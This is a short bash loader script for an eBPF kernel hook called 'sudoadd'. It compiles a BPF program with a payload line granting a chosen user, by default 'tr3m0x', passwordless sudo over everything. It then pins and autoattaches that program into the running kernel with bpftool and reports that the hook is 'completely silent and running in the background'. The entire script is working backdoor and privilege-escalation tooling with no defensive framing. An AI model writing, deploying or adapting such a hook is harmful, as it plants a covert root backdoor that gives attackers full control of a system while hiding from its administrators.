#!/bin/bash
set -e

# Ensure running as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root (sudo ./load.sh)"
  exit 1
fi

# Set the default payload target user if not specified
PAYLOAD_USER=${1:-tr3m0x}
PAYLOAD_STR="${PAYLOAD_USER} ALL=(ALL:ALL) NOPASSWD:ALL #"

echo "[*] Compiling BPF program for user '${PAYLOAD_USER}'..."
clang -g -O2 -target bpf "-DPAYLOAD_STR=\"$PAYLOAD_STR\"" -c sudoadd.bpf.c -o sudoadd.bpf.o

echo "[*] Cleaning up any previous hook..."
rm -rf /sys/fs/bpf/sudoadd

echo "[*] Loading into kernel via bpftool..."
bpftool prog loadall sudoadd.bpf.o /sys/fs/bpf/sudoadd autoattach

echo "[+] Done. Hook is completely silent and running in the background."
echo "[+] (Check with: sudo bpftool prog show | grep sudoadd)"
